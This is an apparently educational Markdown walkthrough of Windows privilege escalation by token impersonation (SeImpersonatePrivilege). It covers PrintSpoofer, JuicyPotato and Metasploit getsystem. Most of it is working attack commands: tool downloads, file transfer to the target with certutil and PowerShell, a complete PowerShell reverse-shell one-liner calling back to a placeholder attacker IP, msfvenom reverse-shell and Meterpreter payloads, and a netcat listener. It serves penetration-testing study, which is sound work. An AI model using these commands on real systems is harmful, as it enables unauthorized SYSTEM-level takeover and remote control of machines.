# 01 — Token Impersonation (Windows)

## What is a Token?

In Windows, when a user logs in, the system creates an **Access Token** for them. This token contains:
- Who the user is (username)
- What groups they belong to
- What privileges they have

Every process that runs on behalf of a user **carries that user's token**. When a process needs to do something (like read a file, access a network share), Windows checks the token to decide if it's allowed.

---

## What is Token Impersonation?

Some Windows services (like IIS web server, SQL Server, Windows Print Spooler) run as high-privilege accounts — like `NT AUTHORITY\SYSTEM` (the highest privilege on Windows).

These services sometimes need to **impersonate** other users temporarily to perform tasks on their behalf.

The Windows privilege that allows this is called:
```
SeImpersonatePrivilege
```

**The problem:**
If you have a shell running as a service account (like `IIS APPPOOL\DefaultAppPool` from a web exploit), and that account has `SeImpersonatePrivilege` — you can **steal SYSTEM's token** and impersonate it.

This means: **web app exploit → low shell → token impersonation → SYSTEM shell**

---

## Why is This So Common?

Service accounts almost always have `SeImpersonatePrivilege` by default. So whenever you pop a shell through:
- Web application exploits (IIS, Apache on Windows)
- SQL Server command execution
- Service exploits

...you will almost always have this privilege available.

---

## Step 1 — Check Your Privileges

After getting a shell:

```cmd
whoami /priv
```

**What this does:** Lists all privileges for your current user/token.

**Example output:**
```
Privilege Name                Description                               State
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
SeCreateGlobalObjects         Create global objects                     Enabled
```

If you see `SeImpersonatePrivilege` as **Enabled** — you can do token impersonation.

---

## Step 2 — Choose Your Exploit Tool

There are multiple tools for token impersonation. They exploit different Windows vulnerabilities but achieve the same result:

| Tool | Works Best On | Method |
|------|--------------|--------|
| **JuicyPotato** | Windows 7-10, Server 2008-2016 | COM server abuse |
| **SweetPotato** | Windows 10, Server 2019 | PrintSpoofer + COM |
| **PrintSpoofer** | Windows 10, Server 2016/2019 | Print spooler abuse |
| **RoguePotato** | Windows 10, Server 2019 | OXID resolver abuse |

**Recommendation for exam/internship:** Try **PrintSpoofer** first, then **JuicyPotato** if it fails.

---

## Method A: PrintSpoofer

### What is PrintSpoofer?

Windows Print Spooler is a service that manages print jobs. It runs as SYSTEM. PrintSpoofer tricks the Print Spooler into authenticating to you, then steals its SYSTEM token.

### Step 1: Download PrintSpoofer (on Kali)

```bash
# Download from GitHub releases
wget https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
```

Use `PrintSpoofer64.exe` for 64-bit systems, `PrintSpoofer32.exe` for 32-bit.

Check target architecture:
```cmd
systeminfo | findstr /B /C:"OS Name" /C:"System Type"
```

### Step 2: Transfer to Target

```bash
# On Kali — start web server
python3 -m http.server 8080
```

```cmd
# On Windows target — download
certutil -urlcache -f http://KALI_IP:8080/PrintSpoofer64.exe PrintSpoofer64.exe
```

**Breaking down `certutil` command:**

| Part | Meaning |
|------|---------|
| `certutil` | Windows built-in certificate utility (can also download files) |
| `-urlcache -f` | Force download from URL |
| `http://KALI_IP:8080/PrintSpoofer64.exe` | Source URL |
| `PrintSpoofer64.exe` | Local filename to save as |

Alternatively:
```powershell
# PowerShell download
powershell -c "Invoke-WebRequest -Uri 'http://KALI_IP:8080/PrintSpoofer64.exe' -OutFile 'PrintSpoofer64.exe'"
```

### Step 3: Run PrintSpoofer

```cmd
PrintSpoofer64.exe -i -c cmd
```

**Breaking down:**

| Part | Meaning |
|------|---------|
| `PrintSpoofer64.exe` | Run the tool |
| `-i` | Interact with the created process (give us an interactive shell) |
| `-c cmd` | The command to run as SYSTEM — we want `cmd` (a command prompt) |

**Expected output:**
```
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
nt authority\system
```

---

## Method B: JuicyPotato

### What is JuicyPotato?

JuicyPotato exploits the way Windows COM (Component Object Model) servers authenticate. It creates a fake COM server and tricks a SYSTEM-level COM service into authenticating to it, then steals the token.

### Step 1: Download

```bash
wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
```

### Step 2: Transfer to target (same method as above)

### Step 3: Create a reverse shell payload

First create a payload that JuicyPotato will execute as SYSTEM:

**Option A: Use a batch file**
```cmd
echo "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('KALI_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()\"" > shell.bat
```

**Option B: Use msfvenom (easier)**

On Kali:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=KALI_IP LPORT=4444 -f exe -o shell.exe
```

**Breaking down:**

| Part | Meaning |
|------|---------|
| `msfvenom` | Metasploit payload generator |
| `-p windows/x64/shell_reverse_tcp` | Windows 64-bit reverse shell payload |
| `LHOST=KALI_IP` | Your Kali IP (where the shell connects back to) |
| `LPORT=4444` | Port to connect back to |
| `-f exe` | Output format: Windows executable |
| `-o shell.exe` | Output filename |

Transfer `shell.exe` to target.

### Step 4: Set up listener on Kali

```bash
nc -lvnp 4444
```

### Step 5: Run JuicyPotato

```cmd
JuicyPotato.exe -l 1337 -p C:\path\to\shell.exe -t * -c {CLSID}
```

**Breaking down:**

| Part | Meaning |
|------|---------|
| `-l 1337` | Local port for COM server |
| `-p C:\path\to\shell.exe` | Program to run as SYSTEM |
| `-t *` | Try both impersonation methods |
| `-c {CLSID}` | COM server class ID to abuse |

**Finding a working CLSID:**
Each Windows version has different CLSIDs. Find them at:
`https://github.com/ohpe/juicy-potato/tree/master/CLSID`

Example for Windows 10:
```cmd
JuicyPotato.exe -l 1337 -p shell.exe -t * -c {F7FD3FD6-9994-452D-8DA7-9A8FD87AEEF4}
```

---

## Method C: Metasploit — getsystem (Easiest in Meterpreter)

If you have a Meterpreter shell:

```bash
# Inside meterpreter
getsystem
```

**What this does:** Automatically tries multiple token impersonation techniques until one works. This is the fastest way.

**If you have a plain reverse shell and want Meterpreter:**
```bash
# On Kali
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=KALI_IP LPORT=5555 -f exe -o meter.exe

# Set up Metasploit listener
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST KALI_IP
set LPORT 5555
run

# Transfer meter.exe to target and run it
# You'll get a meterpreter shell
# Then:
getsystem
```

---

## Verify SYSTEM

```cmd
whoami
# Expected: nt authority\system

# Or in Meterpreter:
getuid
# Expected: Server username: NT AUTHORITY\SYSTEM
```

---

## Summary

```
1. whoami /priv                     → Check for SeImpersonatePrivilege
2. If present, choose tool:
   - PrintSpoofer64.exe -i -c cmd   → Quickest method
   - JuicyPotato.exe ...            → Works on older systems
   - Meterpreter: getsystem         → Easiest if you have meterpreter
3. Get SYSTEM shell
4. Verify: whoami → nt authority\system
```
